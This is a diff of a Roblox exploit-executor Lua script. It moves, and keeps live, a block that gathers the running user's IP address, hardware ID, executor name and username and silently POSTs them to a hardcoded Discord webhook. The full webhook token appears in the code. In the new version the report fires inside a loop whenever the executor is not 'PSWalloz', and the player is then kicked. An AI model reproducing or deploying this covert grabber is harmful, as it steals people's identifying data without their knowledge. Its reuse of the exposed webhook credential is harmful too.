@@ -385,31 +385,28 @@ task.spawn(function()
 
     sendRequest(options, timeout)
 
-    local kakav3 = "Oh No! identifyexecutor -> "..identifyexecutor().."\n getexecutorname -> "..getexecutorname().."\n Ip -> "..discordip().."\n Hwid -> "..gethwid().."\n Username"..game.Players.LocalPlayer.Name
-    local kaka = {
-        Url = "https://discord.com/api/webhooks/1347691014395269130/HY5klKqvCvglZagfYbqrZFSxV2S8slKG6fVn5FRWQdod0DyQLDdpLVO-GKB53M0MSiy6",
-        Body = HttpService:JSONEncode({
-            ['content'] = tostring(kakav3),
-            ['username'] = "Kaka Skidder"--(game.Players.LocalPlayer or game.Players.PlayerAdded:Wait()).Name
-        }),
-        Method = 'POST',
-        Headers = {
-            ["Content-Type"] = "application/json"
-        }
-    }
-    sendRequest(kaka, timeout)
-end)
 
-getgenv().hookmeatmethod = hookmetamethod
-
-loadautoexecutor()
-
-task.spawn(function()
     while true do
         wait(5)
         if identifyexecutor() ~= "PSWalloz" or getexecutorname() ~= "PSWalloz" then
+            local kakav3 = "Oh No! identifyexecutor -> "..identifyexecutor().."\n getexecutorname -> "..getexecutorname().."\n Ip -> "..discordip().."\n Hwid -> "..gethwid().."\n Username"..game.Players.LocalPlayer.Name
+            local kaka = {
+                Url = "https://discord.com/api/webhooks/1347691014395269130/HY5klKqvCvglZagfYbqrZFSxV2S8slKG6fVn5FRWQdod0DyQLDdpLVO-GKB53M0MSiy6",
+                Body = HttpService:JSONEncode({
+                    ['content'] = tostring(kakav3),
+                    ['username'] = "Kaka Skidder"--(game.Players.LocalPlayer or game.Players.PlayerAdded:Wait()).Name
+                }),
+                Method = 'POST',
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                }
+            }
+            sendRequest(kaka, timeout)
             game.Players.LocalPlayer:Kick("Unauthorized executor detected.")
         end
     end
 end)
 
+getgenv().hookmeatmethod = hookmetamethod
+
+loadautoexecutor()
